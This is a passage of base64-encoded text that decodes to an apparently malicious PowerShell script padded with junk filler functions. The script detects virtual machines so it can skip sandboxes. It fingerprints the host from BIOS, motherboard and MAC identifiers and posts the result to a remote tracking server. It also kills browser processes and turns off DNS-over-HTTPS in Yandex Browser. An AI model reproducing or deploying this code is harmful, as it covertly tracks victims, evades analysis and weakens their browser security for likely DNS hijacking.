aGZIWGxLciAtZ3QgMTYpIHsKICAgIFdyaXRlLUhvc3QgJ1pScnhiR1MxOTdtd2FQaCcKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAneGYzU3dObThlMnI2dHZoJwp9CiR2YXJfVGdPcThLZDEgPSBmbl9aQ2t0S1BmbCAtcGFyYW0xIDggLXBhcmFtMiA4CldyaXRlLUhvc3QgJzN1UzdKYklXMWFIUXo1RCcKJHZhcl9RZEY5VzE2NSA9IGZuX1pDa3RLUGZsIC1wYXJhbTEgNyAtcGFyYW0yIDY1CldyaXRlLUhvc3QgJ0dWZ3FDbVdCbHR5RHpBcicKJHZhcl9RZEY5VzE2NSA9IGZuXzJpQ2x1ZVY5IC1wYXJhbTEgODUgLXBhcmFtMiA0MQpXcml0ZS1PdXRwdXQgJ2RWNmx4NGNSNUd1bjBNeicKJHZhcl9KaGZIWGxLciA9IGZuX1hqSE9mek1WIC1wYXJhbTEgMzMgLXBhcmFtMiAxCldyaXRlLU91dHB1dCAncFJpbEUxR0JKWDROZ2FlJwokdmFyX1haQjhTRXB3ID0gZm5fM0ROZlhKNnkgLXBhcmFtMSAyNSAtcGFyYW0yIDUKV3JpdGUtSG9zdCAnbWJlQ2lKdURkd29rQnM2JwokdmFyX1RnT3E4S2QxID0gZm5fWkNrdEtQZmwgLXBhcmFtMSA1MSAtcGFyYW0yIDQ4CldyaXRlLUhvc3QgJ0ZYcXpSU3Y0dGJEdXJNNycKJHZhcl9KaGZIWGxLciA9IGZuX1l1SEZPNnZoIC1wYXJhbTEgMyAtcGFyYW0yIDY3CldyaXRlLU91dHB1dCAnZ1dqRUFxbFBaR1NvYUJVJwokdmFyX1FkRjlXMTY1ID0gZm5fWkNrdEtQZmwgLXBhcmFtMSA3MSAtcGFyYW0yIDYyCldyaXRlLUhvc3QgJ2tCVXpoM0xkQWpNcmN0SCcKJHZhcl9KaGZIWGxLciA9IGZuXzNETmZYSjZ5IC1wYXJhbTEgNTQgLXBhcmFtMiAyMwpXcml0ZS1PdXRwdXQgJ2tJckpobFN5TVp1NkM0VicKJHZhcl9UZ09xOEtkMSA9IGZuXzNETmZYSjZ5IC1wYXJhbTEgNDQgLXBhcmFtMiA3NgpXcml0ZS1PdXRwdXQgJ2JEbzFBeXJjRjRoUXpQSycKJHZhcl9UZ09xOEtkMSA9IGZuXzJpQ2x1ZVY5IC1wYXJhbTEgNTggLXBhcmFtMiA3CldyaXRlLUhvc3QgJ0Z6bVhhU091d3JJMGVMQicKJHZhcl9UZ09xOEtkMSA9IGZuXzJpQ2x1ZVY5IC1wYXJhbTEgMTYgLXBhcmFtMiAxMgpXcml0ZS1PdXRwdXQgJ1FCUlNFRzJyWU9KOG9WWicKJHZhcl90RWNaVDRXOSA9IGZuX1l1SEZPNnZoIC1wYXJhbTEgNDMgLXBhcmFtMiA0NApXcml0ZS1PdXRwdXQgJ0VUWW5mMEdPY1BpSGJBVycKJHZhcl9KaGZIWGxLciA9IGZuXzJpQ2x1ZVY5IC1wYXJhbTEgNzMgLXBhcmFtMiA2MwpXcml0ZS1PdXRwdXQgJ1ZRNWdyaXlsRUgydDlBNycKJHZhcl9UZ09xOEtkMSA9IGZuX1l1SEZPNnZoIC1wYXJhbTEgMjQgLXBhcmFtMiA2OApXcml0ZS1PdXRwdXQgJ3Y1Tm1pczZBRzB5RUtDdycKJHZhcl9RZEY5VzE2NSA9IGZuX1l1SEZPNnZoIC1wYXJhbTEgNTUgLXBhcmFtMiAzNApXcml0ZS1PdXRwdXQgJ0lGazZnMFd6ODQzUGZqbScKJHZhcl9UZ09xOEtkMSA9IGZuX1hqSE9mek1WIC1wYXJhbTEgOTggLXBhcmFtMiAzNgpXcml0ZS1PdXRwdXQgJzI5ZjZTNVFMbXRFOFoxaScKJHZhcl9KaGZIWGxLciA9IGZuX1hqSE9mek1WIC1wYXJhbTEgNDAgLXBhcmFtMiA1NgpXcml0ZS1PdXRwdXQgJ1lyMndPUXBQZUtxSmhJNScKJHZhcl9KaGZIWGxLciA9IGZuXzJpQ2x1ZVY5IC1wYXJhbTEgMzEgLXBhcmFtMiA0CldyaXRlLUhvc3QgJ1FEWUk1ZmRNVHRQWjZOcScKJHZhcl9YWkI4U0VwdyA9IGZuX1hqSE9mek1WIC1wYXJhbTEgODQgLXBhcmFtMiAxOQpXcml0ZS1Ib3N0ICdWeXRRWEZ1TFRyUDlxREMnCiAKCg0KCgoNCg0KZnVuY3Rpb24gSXMtVmlydHVhbE1hY2hpbmUgew0KICAgICMgR2V0IFdpbjMyX0NvbXB1dGVyU3lzdGVtIGluZm9ybWF0aW9uDQogICAgJGNvbXB1dGVyU3lzdGVtID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAgICAkaXNWaXJ0dWFsID0gJGZhbHNlDQoNCiAgICAjIENoZWNrIGZvciBjb21tb24gdmlydHVhbGl6YXRpb24gbWFudWZhY3R1cmVycw0KICAgICR2bU1hbnVmYWN0dXJlcnMgPSBAKA0KICAgICAgICAiTWljcm9zb2Z0IENvcnBvcmF0aW9uIiwgICAjIEh5cGVyLVYNCiAgICAgICAgIlZNd2FyZSwgSW5jLiIsICAgICAgICAgICAgIyBWTXdhcmUNCiAgICAgICAgIlhlbiIsICAgICAgICAgICAgICAgICAgICAgIyBYZW4NCiAgICAgICAgIlhlblNvdXJjZSwgSW5jLiIsICAgICAgICAgIyBYZW5Tb3VyY2UNCiAgICAgICAgImlubm90ZWsgR21iSCIsICAgICAgICAgICAgIyBWaXJ0dWFsQm94DQogICAgICAgICJPcmFjbGUgQ29ycG9yYXRpb24iLCAgICAgICMgVmlydHVhbEJveA0KICAgICAgICAiUGFyYWxsZWxzIFNvZnR3YXJlIEludGVybmF0aW9uYWwgSW5jLiIsICMgUGFyYWxsZWxzDQogICAgICAgICJRRU1VIiwgICAgICAgICAgICAgICAgICAgICMgUUVNVQ0KICAgICAgICAiUmVkIEhhdCwgSW5jLiIsICAgICAgICAgICAjIEtWTQ0KICAgICAgICAiQW1hem9uIEVDMiIsICAgICAgICAgICAgICAjIEFXUyBFQzINCiAgICAgICAgIkdvb2dsZSIsICAgICAgICAgICAgICAgICAgIyBHb29nbGUgQ2xvdWQgUGxhdGZvcm0NCiAgICAgICAgIlZpcnR1b3p6byIsICAgICAgICAgICAgICAgIyBWaXJ0dW96em8NCiAgICAgICAgIkRpZ2l0YWxPY2VhbiIgICAgICAgICAgICAgIyBEaWdpdGFsT2NlYW4NCiAgICApDQoNCiAgICAjIENoZWNrIE1hbnVmYWN0dXJlciBhbmQgTW9kZWwgZm9yIHNpZ25zIG9mIHZpcnR1YWxpemF0aW9uDQogICAgaWYgKCR2bU1hbnVmYWN0dXJlcnMgLWNvbnRhaW5zICRjb21wdXRlclN5c3RlbS5NYW51ZmFjdHVyZXIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfSBlbHNlaWYgKCRjb21wdXRlclN5c3RlbS5Nb2RlbCAtbWF0Y2ggIlZpcnR1YWx8Vk18VkJPWHxLVk18UUVNVXxQYXJhbGxlbHN8WGVuIikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICAjIEFkZGl0aW9uYWwgY2hlY2tzIGZvciB2aXJ0dWFsaXphdGlvbiB1c2luZyBXaW4zMl9CSU9TDQogICAgJGJpb3MgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9CSU9TDQogICAgaWYgKCRiaW9zLlNlcmlhbE51bWJlciAtbWF0Y2ggIlZNd2FyZXxWQk9YfFZpcnR1YWx8WGVufFFFTVV8UGFyYWxsZWxzIikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICAjIEFkZGl0aW9uYWwgY2hlY2tzIHVzaW5nIFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdA0KICAgICRjb21wdXRlclN5c3RlbVByb2R1Y3QgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbVByb2R1Y3QNCiAgICBpZiAoJGNvbXB1dGVyU3lzdGVtUHJvZHVjdC5WZXJzaW9uIC1tYXRjaCAiVmlydHVhbHxWTXxWQk9YfEtWTXxRRU1VfFBhcmFsbGVsc3xYZW4iKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgICMgQWRkaXRpb25hbCByZWdpc3RyeSBjaGVjayBmb3IgUGFyYWxsZWxzDQogICAgJHBhcmFsbGVsc0tleSA9ICJIS0xNOlxTT0ZUV0FSRVxQYXJhbGxlbHNcUGFyYWxsZWxzIFRvb2xzIg0KICAgIGlmIChUZXN0LVBhdGggJHBhcmFsbGVsc0tleSkgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICByZXR1cm4gJGlzVmlydHVhbA0KfQ0KDQoNCmZ1bmN0aW9uIEdldC1NYWNoaW5lSGFzaENvZGUgew0KICAgICMgR2V0IEJJT1MgU2VyaWFsIE51bWJlcg0KICAgICRiaW9zU2VyaWFsID0gKEdldC1XbWlPYmplY3QgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQoNCiAgICAjIEdldCBNb3RoZXJib2FyZCBTZXJpYWwgTnVtYmVyDQogICAgJG1iU2VyaWFsID0gKEdldC1XbWlPYmplY3QgV2luMzJfQmFzZUJvYXJkKS5TZXJpYWxOdW1iZXINCg0KICAgICMgR2V0IE1BQyBBZGRyZXNzIG9mIHRoZSBmaXJzdCBuZXR3b3JrIGFkYXB0ZXINCiAgICAkbWFjQWRkcmVzcyA9IChHZXQtV21pT2JqZWN0IFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB8IFdoZXJlLU9iamVjdCB7ICRfLk1BQ0FkZHJlc3MgLWFuZCAkXy5JUEVuYWJsZWQgfSkuTUFDQWRkcmVzc1swXQ0KDQogICAgIyBDb21iaW5lIHRoZSBoYXJkd2FyZSBpZGVudGlmaWVycyBpbnRvIGEgc2luZ2xlIHN0cmluZw0KICAgICRjb21iaW5lZFN0cmluZyA9ICIkYmlvc1NlcmlhbCRtYlNlcmlhbCRtYWNBZGRyZXNzIg0KDQogICAgIyBDb21wdXRlIHRoZSBoYXNoIGNvZGUgdXNpbmcgU0hBMjU2DQogICAgJHNoYTI1NiA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpDQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkY29tYmluZWRTdHJpbmcpDQogICAgJGhhc2hCeXRlcyA9ICRzaGEyNTYuQ29tcHV0ZUhhc2goJGJ5dGVzKQ0KICAgICRoYXNoU3RyaW5nID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoQnl0ZXMpIC1yZXBsYWNlICItIiwgIiINCg0KICAgIHJldHVybiAkaGFzaFN0cmluZw0KfQ0KDQoNCmZ1bmN0aW9uIEdlbmVyYXRlLUhhc2ggew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZGF0YSwNCiAgICAgICAgW3N0cmluZ10ka2V5DQogICAgKQ0KDQogICAgJGtleUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygka2V5KQ0KICAgICRkYXRhQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRkYXRhKQ0KICAgIA0KICAgICRobWFjID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkhNQUNTSEEyNTYNCiAgICAkaG1hYy5LZXkgPSAka2V5Qnl0ZXMNCiAgICAkaGFzaEJ5dGVzID0gJGhtYWMuQ29tcHV0ZUhhc2goJGRhdGFCeXRlcykNCiAgICANCiAgICByZXR1cm4gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkaGFzaEJ5dGVzKQ0KfQ0KDQpmdW5jdGlvbiBXcml0ZS1TdHJpbmdUb0ZpbGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kRmlsZU5hbWUsDQogICAgICAgIFtzdHJpbmddJENvbnRlbnQNCiAgICApDQogICAgDQogICAgIyBHZXQgdGhlIHBhdGggdG8gdGhlIGRlc2t0b3ANCiAgICAkRGVza3RvcFBhdGggPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpDQogICAgDQogICAgIyBDcmVhdGUgdGhlIGZ1bGwgcGF0aCB0byB0aGUgZmlsZQ0KICAgICRGaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkRGVza3RvcFBhdGggLUNoaWxkUGF0aCAkRmlsZU5hbWUNCiAgICANCiAgICAjIFdyaXRlIHRoZSBjb250ZW50IHRvIHRoZSBmaWxlLCBjcmVhdGluZyBvciBvdmVyd3JpdGluZyBpdA0KICAgIFNldC1Db250ZW50IC1QYXRoICRGaWxlUGF0aCAtVmFsdWUgJENvbnRlbnQNCn0NCg0KZnVuY3Rpb24gRG9UcmFjayB7DQogICAgaWYgKCRzZXJ2ZXIudHJhY2sgLWVxICRmYWxzZSl7DQogICAgICAgIHJldHVybg0KICAgIH0NCg0KICAgICRpc1ZNID0gSXMtVmlydHVhbE1hY2hpbmUNCiAgICBpZiAoJGlzVk0gLWVxICR0cnVlKXsNCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgJGlkID0gR2V0LU1hY2hpbmVIYXNoQ29kZQ0KDQogICAgJGJvZHkgPSAie2AiaWRgIjpgIiQoJGlkLlRvU3RyaW5nKCkpYCIsYCJzZXJpZWAiOmAiJCgkc2VydmVyLnRyYWNrU2VyaWUuVG9TdHJpbmcoKSlgIixgIm51bWJlcmAiOmAiJCgkaWQuVG9TdHJpbmcoKSlgIn0iDQoNCg0KICAgICMgU2VjcmV0IGtleSAoc2hhcmVkIHdpdGggdGhlIHNlcnZlcikNCiAgICAkc2VjcmV0S2V5ID0gIllvdXJTZWNyZXRLZXlIZXJlIg0KDQogICAgJHVybD0gJHNlcnZlci50cmFja1VybA0KICANCiAgICAjIEdlbmVyYXRlIHRoZSBoYXNoIGZvciB0aGUgSlNPTiByZXF1ZXN0IGJvZHkNCiAgICAkaGFzaCA9IEdlbmVyYXRlLUhhc2ggLWRhdGEgJGJvZHkgLWtleSAkc2VjcmV0S2V5DQoNCiAgICAjIFByZXBhcmUgaGVhZGVycw0KICAgICRoZWFkZXJzID0gQHsNCiAgICAgICAgIlgtU2lnbmF0dXJlIiA9ICRoYXNoDQogICAgICAgICJDb250ZW50LVR5cGUiID0gImFwcGxpY2F0aW9uL2pzb24iDQogICAgICAgICJVc2VyLUFnZW50IiAgPSAiUG93ZXJTaGVsbC83LjIiICAjIFVzZSB0aGUgVXNlci1BZ2VudCBmcm9tIFBvc3RtYW4gaWYga25vd24NCiAgICB9DQoNCiAgICAkdGltZW91dCA9IFtkYXRldGltZV06OlV0Y05vdy5BZGRNaW51dGVzKDEpDQogICAgJGRlbGF5ID0gNQ0KDQogICAgDQogICAgd2hpbGUgKFtkYXRldGltZV06OlV0Y05vdyAtbHQgJHRpbWVvdXQpIA0KICAgIHsNCiAgICAgDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtSGVhZGVycyAkaGVhZGVycyAtTWV0aG9kICJQT1NUIiAtQm9keSAkYm9keSAtVXJpICR1cmwgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04Ig0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggW1N5c3RlbS5OZXQuV2ViRXhjZXB0aW9uXSB7DQogICAgICAgICAgICAgICAgICAgICRzdGF0dXNDb2RlID0gJF8uRXhjZXB0aW9uLlJlc3BvbnNlLlN0YXR1c0NvZGUNCiAgICAgICAgICAgICAgICAgICAgJHJlc3BTdHJlYW0gPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKQ0KICAgICAgICAgICAgICAgICAgICAkcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCRyZXNwU3RyZWFtKQ0KICAgICAgICAgICAgICAgICAgICAkcmVhZGVyLkJhc2VTdHJlYW0uUG9zaXRpb24gPSAwDQogICAgICAgICAgICAgICAgICAgICRyZXNwb25zZUJvZHkgPSAkcmVhZGVyLlJlYWRUb0VuZCgpIHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkVycm9yIG1ha2luZyByZXF1ZXN0OiAkcmVzcG9uc2VCb2R5Ig0KICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2h7DQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3IgbWFraW5nIHJlcXVlc3Q6ICRfIg0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheQ0KDQogICAgfQ0KDQoNCiAgICBpZiAoJHNlcnZlci50cmFja0Rlc2t0b3AgLWVxICR0cnVlKXsNCiAgICAgICAgV3JpdGUtU3RyaW5nVG9GaWxlIC1GaWxlTmFtZSAiJCgkc2VydmVyLnRyYWNrU2VyaWUpLnR4dCIgLUNvbnRlbnQgJGlkDQogICAgfQ0KDQp9DQpmdW5jdGlvbiBmbl9Mb2dfSXdLczZVcTQgewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UKICAgICkKICAgIFdyaXRlLU91dHB1dCAnTG9nOiAkbWVzc2FnZScKfQpmdW5jdGlvbiBmbl9vUWxHNkRhUyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX3NWdkVESFI3LAogICAgICAgIFtpbnRdJHZhcl9jemF2aVVxNwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfc1Z2RURIUjcgKyAkdmFyX2N6YXZpVXE3CiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX3NOem5iaExrIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfY3phdmlVcTcsCiAgICAgICAgW2ludF0kdmFyX2dPSlg1U1BWCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9jemF2aVVxNyArICR2YXJfZ09KWDVTUFYKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fQm9SM204anAgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9nT0pYNVNQViwKICAgICAgICBbaW50XSR2YXJfYXFpb1NlMDgKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX2dPSlg1U1BWICsgJHZhcl9hcWlvU2UwOAogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl96ZFVnMVFXUyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2FxaW9TZTA4LAogICAgICAgIFtpbnRdJHZhcl9WOFBVQ0FUWQogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfYXFpb1NlMDggKyAkdmFyX1Y4UFVDQVRZCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX2JNdU43MmdGIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfVjhQVUNBVFksCiAgICAgICAgW2ludF0kdmFyX3NWdkVESFI3CiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9WOFBVQ0FUWSArICR2YXJfc1Z2RURIUjcKICAgIHJldHVybiAkcmVzdWx0Cn0KaWYgKCR2YXJfc1Z2RURIUjcgLWd0IDE2KSB7CiAgICBXcml0ZS1PdXRwdXQgJzRReGExR25vN2ZBVk16cCcKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ0FYZXZTQjEySGo1RUNiRycKfQppZiAoJHZhcl9jemF2aVVxNyAtZ3QgNCkgewogICAgV3JpdGUtT3V0cHV0ICc2Mms3SUd5bnh2SEJRb2onCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ2NnRnlXb1poZUxqYUFFWScKfQppZiAoJHZhcl9nT0pYNVNQViAtZ3QgNCkgewogICAgV3JpdGUtSG9zdCAnQXdjUG9xMVFGdlloNUNSJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdLZ21qSHo0ZURBbEpPcGEnCn0KaWYgKCR2YXJfYXFpb1NlMDggLWd0IDcpIHsKICAgIFdyaXRlLUhvc3QgJ3J0d1JLMFkzZFo5TXB4SCcKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ3JMSll4Y1Zwb0MydlVGdScKfQppZiAoJHZhcl9WOFBVQ0FUWSAtZ3QgMTEpIHsKICAgIFdyaXRlLUhvc3QgJ2tpNUhvY2hHZk5zRjZBeCcKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ1NPMHY2WWpsRkFWZ2tDSScKfQokdmFyX2dPSlg1U1BWID0gZm5fYk11TjcyZ0YgLXBhcmFtMSA5MyAtcGFyYW0yIDc1CldyaXRlLUhvc3QgJ3pvbVpPdnF4QjJHV0ExMycKJHZhcl9nT0pYNVNQViA9IGZuX3NOem5iaExrIC1wYXJhbTEgNzcgLXBhcmFtMiAyMQpXcml0ZS1PdXRwdXQgJzZmRHdXMDg3VDR0Rm8zYScKJHZhcl9jemF2aVVxNyA9IGZuX3NOem5iaExrIC1wYXJhbTEgMzAgLXBhcmFtMiAzNwpXcml0ZS1Ib3N0ICdNSmlXRWV6ZEtjeHBST2YnCiR2YXJfVjhQVUNBVFkgPSBmbl9Cb1IzbThqcCAtcGFyYW0xIDIzIC1wYXJhbTIgODQKV3JpdGUtSG9zdCAnQjNJdFptVnhwU25QMUZlJwokdmFyX1Y4UFVDQVRZID0gZm5fc056bmJoTGsgLXBhcmFtMSA3NiAtcGFyYW0yIDQxCldyaXRlLU91dHB1dCAnYVNzcHdKeU5VbENGWTVlJwokdmFyX1Y4UFVDQVRZID0gZm5fYk11TjcyZ0YgLXBhcmFtMSA2MyAtcGFyYW0yIDI0CldyaXRlLU91dHB1dCAnVVFybmc4aG81REtOa3daJwokdmFyX3NWdkVESFI3ID0gZm5fYk11TjcyZ0YgLXBhcmFtMSA5OCAtcGFyYW0yIDUzCldyaXRlLUhvc3QgJ3VzNzlGT1BXMjNjNGhWbCcKJHZhcl9jemF2aVVxNyA9IGZuX2JNdU43MmdGIC1wYXJhbTEgNDAgLXBhcmFtMiA4NApXcml0ZS1PdXRwdXQgJ1RvdE5TS2RjV2hIMzkyRicKJHZhcl9hcWlvU2UwOCA9IGZuX3pkVWcxUVdTIC1wYXJhbTEgMjkgLXBhcmFtMiA2NgpXcml0ZS1PdXRwdXQgJ25sZkVLdzBVQ2I3MjZGaicKJHZhcl9hcWlvU2UwOCA9IGZuX3pkVWcxUVdTIC1wYXJhbTEgOTggLXBhcmFtMiA3NQpXcml0ZS1PdXRwdXQgJ0RiVG9BWElxQ1Z3dGg3eScKJHZhcl9nT0pYNVNQViA9IGZuX3NOem5iaExrIC1wYXJhbTEgMTAgLXBhcmFtMiAxNgpXcml0ZS1PdXRwdXQgJ0NmTkVnazVWUmREY0xuYicKJHZhcl9zVnZFREhSNyA9IGZuX2JNdU43MmdGIC1wYXJhbTEgNjQgLXBhcmFtMiA0MQpXcml0ZS1Ib3N0ICd6eHV2ajlvSzNMREFUd2cnCiR2YXJfZ09KWDVTUFYgPSBmbl96ZFVnMVFXUyAtcGFyYW0xIDY2IC1wYXJhbTIgNjAKV3JpdGUtT3V0cHV0ICdMRXBlNWZqaUNERkFtMk0nCiR2YXJfVjhQVUNBVFkgPSBmbl9Cb1IzbThqcCAtcGFyYW0xIDEgLXBhcmFtMiA0MApXcml0ZS1Ib3N0ICdpNWJBeVlsc01oM3VQb2QnCiR2YXJfVjhQVUNBVFkgPSBmbl9zTnpuYmhMayAtcGFyYW0xIDgxIC1wYXJhbTIgMjMKV3JpdGUtT3V0cHV0ICdpbmpKNHRTcG9oRlc1c0InCiR2YXJfVjhQVUNBVFkgPSBmbl96ZFVnMVFXUyAtcGFyYW0xIDE3IC1wYXJhbTIgNzEKV3JpdGUtSG9zdCAnSWRzd0c3U1pXVGFCRk5NJwokdmFyX3NWdkVESFI3ID0gZm5fQm9SM204anAgLXBhcmFtMSA3MCAtcGFyYW0yIDUwCldyaXRlLU91dHB1dCAndnk2ZW1GdGxJeE9rRzVNJwokdmFyX3NWdkVESFI3ID0gZm5fQm9SM204anAgLXBhcmFtMSA3NSAtcGFyYW0yIDYKV3JpdGUtT3V0cHV0ICdwNTM4SlAxS2k5b0RoTnEnCiR2YXJfYXFpb1NlMDggPSBmbl96ZFVnMVFXUyAtcGFyYW0xIDU4IC1wYXJhbTIgMTkKV3JpdGUtSG9zdCAndFVMYnJDdUowRktZV0dQJwokdmFyX2dPSlg1U1BWID0gZm5fYk11TjcyZ0YgLXBhcmFtMSA1NCAtcGFyYW0yIDc2CldyaXRlLU91dHB1dCAnM3JjdTlFUEJ4YkFlUkRkJwogCgoNCg0KZnVuY3Rpb24gQ29uZmlndXJlWWFuZGV4DQp7DQogICAgQ2xvc2UtUHJvY2Vzc2VzKEAoJ3NlcnZpY2VfdXBkYXRlLmV4ZScsJ2Jyb3dzZXIuZXhlJykpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggJ1lhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZScNCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWd1cmVZYW5kZXhJbnRlcm5hbCAtRmlsZVBhdGggJHBhdGgNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVZYW5kZXhJbnRlcm5hbCB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJGZpbGVQYXRoDQogICAgKQ0KICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoJG51bGwgLWVxICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1vciAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtaXNub3QgW29iamVjdF0pIHsNCiAgICAgICAgJGNvbnRlbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnZG5zX292ZXJfaHR0cHMnIC1WYWx1ZSBAew0KICAgICAgICAgICAgJ21vZGUnID0gJ29mZicNCiAgICAgICAgICAgICd0ZW1wbGF0ZXMnID0gIiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm1vZGUgPSAnb2ZmJw0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy50ZW1wbGF0ZXMgPSAiIg0KICAgIH0NCg0KICAgICRqc29uU3RyaW5nID0gJGNvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCg0KICAgIFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtVmFsdWUgJGpzb25TdHJpbmcgLUVuY29kaW5nIFVURjggLUZvcmNlDQoNCiAgICBXcml0ZS1Ib3N0ICJTdWNjZXNzZnVsbHkgY29uZmlndXJlZCBZYW5kZXggc2V0dGluZ3MgaW4gJGZpbGVQYXRoIg0KfQ0KZnVuY3Rpb24gZm5fTG9nX0QwWFZseDJKIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlCiAgICApCiAgICBXcml0ZS1PdXRwdXQgJ0xvZzogJG1lc3NhZ2UnCn0KZnVuY3Rpb24gZm5fRnEyY1dEU1ogewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl92Q0g0RDZRbCwKICAgICAgICBbaW50XSR2YXJfcHR6VEg0RDEKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3ZDSDRENlFsICsgJHZhcl9wdHpUSDREMQogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9mcGxScTBhWSB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX3B0elRINEQxLAogICAgICAgIFtpbnRdJHZhcl93a1pZSVNFMwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfcHR6VEg0RDEgKyAkdmFyX3drWllJU0UzCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX0hzbFpMTkl1IHsKICAgIHBhcmFtICg